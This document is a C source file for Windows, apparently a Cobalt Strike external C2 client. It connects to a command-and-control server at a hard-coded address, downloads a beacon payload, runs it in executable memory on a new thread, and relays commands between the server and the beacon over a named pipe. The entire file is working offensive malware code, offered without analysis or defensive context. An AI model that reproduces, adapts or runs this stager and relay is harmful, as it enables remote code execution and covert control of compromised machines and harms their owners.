
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
//#include <iostream>
#pragma comment (lib, "Ws2_32.lib")
// #include "stdafx.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h> 
#include <stdlib.h>
//#include <time.h>

// Allocates a RWX page for the CS beacon, copies the payload, and starts a new thread
void spawnBeacon(char* payload, DWORD len) {

	HANDLE threadHandle;
	DWORD threadId = 0;
	char* alloc = (char*)VirtualAlloc(NULL, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(alloc, payload, len);

	threadHandle = CreateThread(NULL, (SIZE_T)NULL, (LPTHREAD_START_ROUTINE)alloc, NULL, 0, &threadId);
}

// Sends data to our C2 controller received from our injected beacon
void sendData(SOCKET sd, const char* data, DWORD len) {
	char* buffer = (char*)malloc(len + 4);
	if (buffer == NULL)
		return;

	DWORD bytesWritten = 0, totalLen = 0;

	*(DWORD*)buffer = len;
	memcpy(buffer + 4, data, len);

	while (totalLen < len + 4) {
		bytesWritten = send(sd, buffer + totalLen, len + 4 - totalLen, 0);
		totalLen += bytesWritten;
	}
	free(buffer);
}

// Receives data from our C2 controller to be relayed to the injected beacon
char* recvData(SOCKET sd, DWORD* len) {
	char* buffer;
	DWORD bytesReceived = 0, totalLen = 0;

	*len = 0;

	recv(sd, (char*)len, 4, 0);
	buffer = (char*)malloc(*len);
	if (buffer == NULL)
		return NULL;

	while (totalLen < *len) {
		bytesReceived = recv(sd, buffer + totalLen, *len - totalLen, 0);
		totalLen += bytesReceived;
	}
	return buffer;
}

// Creates a new C2 controller connection for relaying commands
SOCKET createC2Socket(const char* addr, WORD port) {
	WSADATA wsd;
	SOCKET sd;
	SOCKADDR_IN sin;
	WSAStartup(0x0202, &wsd);

	memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_port = htons(port);
	sin.sin_addr.S_un.S_addr = inet_addr(addr);

	sd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
	connect(sd, (SOCKADDR*)& sin, sizeof(sin));

	return sd;
}

// Connects to the name pipe spawned by the injected beacon
HANDLE connectBeaconPipe(const char* pipeName) {
	HANDLE beaconPipe;

	beaconPipe = CreateFileA(pipeName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, (DWORD)NULL, NULL);

	return beaconPipe;
}

// Receives data from our injected beacon via a named pipe
char* recvFromBeacon(HANDLE pipe, DWORD* len) {
	char* buffer;
	DWORD bytesRead = 0, totalLen = 0;

	*len = 0;

	ReadFile(pipe, len, 4, &bytesRead, NULL);
	buffer = (char*)malloc(*len);

	while (totalLen < *len) {
		ReadFile(pipe, buffer + totalLen, *len - totalLen, &bytesRead, NULL);
		totalLen += bytesRead;
	}
	return buffer;
}

// Write data to our injected beacon via a named pipe
void sendToBeacon(HANDLE pipe, const char* data, DWORD len) {
	DWORD bytesWritten = 0;
	WriteFile(pipe, &len, 4, &bytesWritten, NULL);
	WriteFile(pipe, data, len, &bytesWritten, NULL);
}

int main()
{
	DWORD payloadLen = 0;
	char* payloadData = NULL;
	HANDLE beaconPipe = INVALID_HANDLE_VALUE;

	// Create a connection back to our C2 controller
	SOCKET c2socket = createC2Socket("192.168.136.130", 8081);
	payloadData = recvData(c2socket, &payloadLen);

	// Start the CS beacon
	spawnBeacon(payloadData, payloadLen);

	// Loop until the pipe is up and ready to use
	while (beaconPipe == INVALID_HANDLE_VALUE) {
		// Create our IPC pipe for talking to the C2 beacon
		Sleep(500);
		beaconPipe = connectBeaconPipe("\\\\.\\pipe\\xpntest");
	}

	while (1) {
		// Start the pipe dance
		payloadData = recvFromBeacon(beaconPipe, &payloadLen);
		if (payloadLen == 0) break;
		if (payloadLen == 1) Sleep(2000);

		sendData(c2socket, payloadData, payloadLen);
		free(payloadData);

		payloadData = recvData(c2socket, &payloadLen);
		if (payloadLen == 0) break;

		sendToBeacon(beaconPipe, payloadData, payloadLen);
		free(payloadData);
	}


	return 0;
}

